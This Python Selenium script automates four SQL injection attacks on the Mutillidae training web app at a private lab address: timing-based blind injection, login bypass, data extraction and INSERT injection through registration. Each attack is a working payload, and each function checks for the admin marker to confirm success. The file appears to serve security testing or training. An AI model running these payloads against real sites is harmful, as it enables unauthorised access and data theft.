from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from time import sleep
from modules.SeleniumDrivers import FirefoxBrowser
import random, string


def blind_sqli_via_timing(
    ip="192.168.255.133",
    sleep_time=0,
    payload="'-SLEEP(1) -- ",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=login.php")
        browser.find_element(By.NAME, "username").send_keys(payload)
        browser.find_element(By.NAME, "login-php-submit-button").click()
        sleep(sleep_time + 100)
        if verify_default_payload:
            element = browser.find_element(By.ID, "idSystemInformationHeading")
            print(f'Output of the payload: {element.get_attribute("innerHTML")}')
            if "admin</span> (g0t r00t?)" in element.get_attribute("innerHTML"):
                print("BLIND SQL injection via timing succeeded")
                return True
            else:
                print("BLIND SQL injection via timing failed")
                return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def sqli_bypass_authentication(
    ip="192.168.255.133",
    sleep_time=0,
    payload="' or 'a'='a",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=login.php")
        browser.find_element(By.NAME, "username").send_keys(payload)
        browser.find_element(By.NAME, "password").send_keys(payload)
        browser.find_element(By.NAME, "login-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(By.ID, "idSystemInformationHeading")
            print(f'Output of the payload: {element.get_attribute("innerHTML")}')
            if "admin</span> (g0t r00t?)" in element.get_attribute("innerHTML"):
                print("SQL injection bypass authentication succeeded")
                return True
            else:
                print("SQL injection bypass authentication failed")
                return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def sqli_extract_data(
    ip="192.168.255.133",
    sleep_time=0,
    payload="' or 1=1 -- ",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=user-info.php")
        browser.find_element(By.NAME, "username").send_keys(payload)
        browser.find_element(By.NAME, "user-info-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            elements = browser.find_elements(By.TAG_NAME, "span")
            flag = False
            for element in elements:
                element_content = element.get_attribute("innerHTML")
                if "g0t r00t" in element_content:
                    flag = True
                print(f"{element_content}")
            if flag:
                print("SQL injection - Extract Data succeeded")
                return True
            else:
                print("SQL injection - Extract Data failed")
                return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def sqli_insert(
    ip="192.168.255.133",
    sleep_time=0,
    payload="x', (select version())) -- -",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=register.php")
        username = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        browser.find_element(By.NAME, "username").send_keys(username)
        browser.find_element(By.NAME, "password").send_keys(payload)
        browser.find_element(By.NAME, "confirm_password").send_keys(payload)
        browser.find_element(By.NAME, "register-php-submit-button").click()

        browser.get(f"http://{ip}/mutillidae/index.php?page=login.php")
        browser.find_element(By.NAME, "username").send_keys(username)
        browser.find_element(By.NAME, "password").send_keys("x")
        browser.find_element(By.NAME, "login-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(By.ID, "idSystemInformationHeading")
            print(f'Output of the payload: {element.get_attribute("innerHTML")}')
            if "Logged In User" in element.get_attribute("innerHTML"):
                print("SQL injection - Insert injection succeeded")
                return True
            else:
                print("SQL injection - Insert injection failed")
                return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()
